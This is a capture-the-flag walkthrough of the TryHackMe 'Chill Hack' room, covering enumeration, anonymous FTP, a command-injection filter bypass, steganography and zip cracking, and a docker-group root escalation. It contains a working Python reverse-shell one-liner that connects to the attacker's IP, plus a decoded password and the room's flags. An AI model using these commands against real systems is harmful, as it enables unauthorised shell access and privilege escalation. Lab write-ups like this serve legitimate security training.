## Chill Hack - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/chillhack)

<i>Chill the Hack out of the Machine.

Easy level CTF.  Capture the flags and have fun!</i>

**IP: 10.10.129.112**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy   <br>

**Room Type**: Linux Privilege Escalation, Web, Steganography <br>

**Tools Used**: Nmap, Ffuf, John The Ripper, Steghide<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting of with Nmap scan and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.129.112

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 4
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
  |   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
  |_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Game Info
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.129.112/FUZZ -w /usr/share/wordlists/dirb/common.txt

  .htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 274ms]
  .htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 274ms]
                          [Status: 200, Size: 35184, Words: 16992, Lines: 644, Duration: 274ms]
  .hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1037ms]
  css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 46ms]
  fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 47ms]
  images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 49ms]
  index.html              [Status: 200, Size: 35184, Words: 16992, Lines: 644, Duration: 78ms]
  js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 49ms]
  secret                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 46ms]
  server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 48ms]
  :: Progress: [4614/4614] :: Job [1/1] :: 851 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
  ```
  
- Before visiting the web page, I logged in with FTP and got the secret note. Username is `Anonymous` and no password.

  ```
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls
  229 Entering Extended Passive Mode (|||44133|)
  150 Here comes the directory listing.
  -rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
  226 Directory send OK.
  ftp> ls -la
  229 Entering Extended Passive Mode (|||44691|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 0        115          4096 Oct 03  2020 .
  drwxr-xr-x    2 0        115          4096 Oct 03  2020 ..
  -rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
  226 Directory send OK.
  ftp> get note.txt
  local: note.txt remote: note.txt
  229 Entering Extended Passive Mode (|||59982|)
  150 Opening BINARY mode data connection for note.txt (90 bytes).
  100% |************************************************************************|    90       40.33 KiB/s    00:00 ETA
  226 Transfer complete.
  90 bytes received in 00:00 (1.79 KiB/s)
  ftp> exit
  221 Goodbye.

  cat note.txt        
  Anurodh told me that there is some filtering on strings being put in the command -- Apaar
  ```
  
- After that, I visited the `/secret` directory and there is an command injection option. The thing is, not all commands work since it's sanitized as note already told us. I used `find command` in order to get the reverse shell.

---

## ⚙️ Shell Access

- I tried multiple different reverse shells and this is the one that worked for me, also you must combine it with find command in order for it to work. Don't forget to start a listener! Syntax is `find /path/to/file -exec {} <command> \;`

  ```
  find /usr/bin/python3 -exec {} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[YOUR-THM-IP]",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \;

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.129.112] 38422
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  ```
  
- Change it to putty shell and start looking for flags.

---

## 🧍 User Privilege Escalation

- While moving down the ladder, I found a folder with some images. Download the hacker one since it contains hidden files. Start a Python HTTP server from target machine and use `wget` to move it to your Kali.

  ```
  www-data@ubuntu:/var/www/files$ cd images/
  www-data@ubuntu:/var/www/files/images$ ls -al
  total 2112
  drwxr-xr-x 2 root root    4096 Oct  3  2020 .
  drwxr-xr-x 3 root root    4096 Oct  3  2020 ..
  -rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
  -rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
  
  www-data@ubuntu:/var/www/files/images$ python3 -m http.server 1234
  Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
  [YOUR-THM-IP] - - [14/May/2025 14:43:51] "GET /hacker-with-laptop_23-2147985341.jpg HTTP/1.1" 200 -
  [YOUR-THM-IP] - - [14/May/2025 14:44:08] "GET /002d7e638fb463fb7a266f5ffc7ac47d.gif HTTP/1.1" 200 -
  ^C
  Keyboard interrupt received, exiting.

  wget http://10.10.129.112:1234/hacker-with-laptop_23-2147985341.jpg
  wget http://10.10.129.112:1234/002d7e638fb463fb7a266f5ffc7ac47d.gif
  ```
  
- Steghide will uncover hidden files.

  ```
  steghide --extract -sf hacker-with-laptop_23-2147985341.jpg   
  Enter passphrase: 
  wrote extracted data to "backup.zip".

  unzip backup.zip 
  Archive:  backup.zip
  [backup.zip] source_code.php password: 
     skipping: source_code.php         incorrect password
  ```
  
- Well, denied, no password. We can get it with John. Convert the ZIP file to hash, crack the hash and use that password to extract the ZIP.

  ```
  zip2john backup.zip > zip.hash
  ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8

  john --wordlist=/home/mauzware/Desktop/rockyou.txt zip.hash                    
  Using default input encoding: UTF-8
  Loaded 1 password hash (PKZIP [32/64])
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  pass1word        (backup.zip/source_code.php)     
  1g 0:00:00:00 DONE (2025-05-14 15:49) 100.0g/s 1228Kp/s 1228Kc/s 1228KC/s total90..hawkeye
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.

  unzip backup.zip 
  Archive:  backup.zip
  [backup.zip] source_code.php password: 
    inflating: source_code.php 
  ```

- Alrighty, check the source code.

  ```
  cat source_code.php
  <html>
  <head>
          Admin Portal
  </head>
          <title> Site Under Development ... </title>
          <body>
                  <form method="POST">
                          Username: <input type="text" name="name" placeholder="username"><br><br>
                          Email: <input type="email" name="email" placeholder="email"><br><br>
                          Password: <input type="password" name="password" placeholder="password">
                          <input type="submit" name="submit" value="Submit"> 
                  </form>
  <?php
          if(isset($_POST['submit']))
          {
                  $email = $_POST["email"];
                  $password = $_POST["password"];
                  if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                  { 
                          $random = rand(1000,9999);?><br><br><br>
                          <form method="POST">
                                  Enter the OTP: <input type="number" name="otp">
                                  <input type="submit" name="submitOtp" value="Submit">
                          </form>
                  <?php   mail($email,"OTP for authentication",$random);
                          if(isset($_POST["submitOtp"]))
                                  {
                                          $otp = $_POST["otp"];
                                          if($otp == $random)
                                          {
                                                  echo "Welcome Anurodh!";
                                                  header("Location: authenticated.php");
                                          }
                                          else
                                          {
                                                  echo "Invalid OTP";
                                          }
                                  }
                  }
                  else
                  {
                          echo "Invalid Username or Password";
                  }
          }
  ?>
  </html>
  ```

- This is exactly what we need, decode the password and login as Anurodh with SSH.

  ```
  echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
  !d0ntKn0wmYp@ssw0rd 
  
  ssh anurodh@10.10.129.112
  
  anurodh@ubuntu:~$ whoami
  anurodh
  anurodh@ubuntu:~$ id
  uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
  ```

- OK, I found the first flag, but couldn't read it, so I escalated to root first.

  ```
  anurodh@ubuntu:/home/apaar$ ls -al
  total 44
  drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
  drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
  -rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
  -rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
  -rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
  drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
  drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
  -rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
  -rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
  -rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
  drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
  -rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
  ```

---

## 👑 Root Privilege Escalation

- OK, so user `anurodh` being is group docker is soooooooo weird, there must be a docker somewhere right? Before exploiting docker and tired to escalate with that `.helpline.sh` file but couldn't make it. I wasted a lot of time there before exploiting docker.
  
- After wasting a lot of time on `.helpline.sh`, I cheked all writeable files.

  ```
  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  dev/char
  dev/fd
  dev/full
  dev/fuse
  dev/log
  dev/mqueue
  dev/net
  dev/null
  dev/ptmx
  dev/pts
  dev/random
  dev/shm
  dev/stderr
  dev/stdin
  dev/stdout
  dev/tty
  dev/urandom
  dev/zero
  home/anurodh
  lib/systemd
  run/acpid.socket
  run/dbus
  run/docker.sock
  run/lock
  run/mysqld
  run/screen
  run/shm
  run/snapd-snap.socket
  run/snapd.socket
  run/systemd
  run/user
  run/uuidd
  sys/fs
  sys/kernel
  tmp
  tmp/.font-unix
  tmp/.ICE-unix
  tmp/.Test-unix
  tmp/.X11-unix
  tmp/.XIM-unix
  var/crash
  var/lib
  var/lock
  var/tmp
  ```
  
- I knew it! Having docker group is so weird, `/run/docket.sock` is our way to root. Check the docker image as well.

  ```
  anurodh@ubuntu:/home/apaar$ docker images
  REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
  alpine              latest              a24bb4013296        4 years ago         5.57MB
  hello-world         latest              bf756fb1ae65        5 years ago         13.3kB
  ```

- Now lastly, run a simple one-liner from GTFOBins and read both flags.

  ```
  anurodh@ubuntu:/home/apaar$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  groups: cannot find name for group ID 11
  To run a command as administrator (user "root"), use "sudo <command>".
  See "man sudo_root" for details.
  
  root@c361c7967535:/# whoami
  root
  ```

- We already know where first one is. Second one is in root directory of course.

  ```
  root@c361c7967535:/home# cd apaar/
  root@c361c7967535:/home/apaar# cat local.txt
  {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}

  root@c361c7967535:/# cd root
  root@c361c7967535:~# ls -la
  total 68
  drwx------  6 root root  4096 Oct  4  2020 .
  drwxr-xr-x 24 root root  4096 Oct  3  2020 ..
  -rw-------  1 root root     0 Oct  4  2020 .bash_history
  -rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
  drwx------  2 root root  4096 Oct  3  2020 .cache
  drwx------  3 root root  4096 Oct  3  2020 .gnupg
  -rw-------  1 root root   370 Oct  4  2020 .mysql_history
  -rw-r--r--  1 root root   148 Aug 17  2015 .profile
  -rw-r--r--  1 root root 12288 Oct  4  2020 .proof.txt.swp
  drwx------  2 root root  4096 Oct  3  2020 .ssh
  drwxr-xr-x  2 root root  4096 Oct  3  2020 .vim
  -rw-------  1 root root 11683 Oct  4  2020 .viminfo
  -rw-r--r--  1 root root   166 Oct  3  2020 .wget-hsts
  -rw-r--r--  1 root root  1385 Oct  4  2020 proof.txt
  root@c361c7967535:~# cat proof.txt 
  
  
                                          {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
  
  
  Congratulations! You have successfully completed the challenge.
  
  
           ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
  ,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
  |, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
  |- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
   \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
   | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
    \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
    |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
    `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  
  
  
  --------------------------------------------Designed By -------------------------------------------------------
                                          |  Anurodh Acharya |
                                          ---------------------
  
                                       Let me know if you liked it.
  
  Twitter
          - @acharya_anurodh
  Linkedin
          - www.linkedin.com/in/anurodh-acharya-b1937116a
  ```

- You even get a nice message after hard work, such a cool detail from room creator! 👑

---

## 🏁 Flags

- **User Flag**: `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`
- **Root Flag**: `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `A lot of enumeration and exploring.`

- What did I learn?
  `New different methods of escalation and exploitation`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
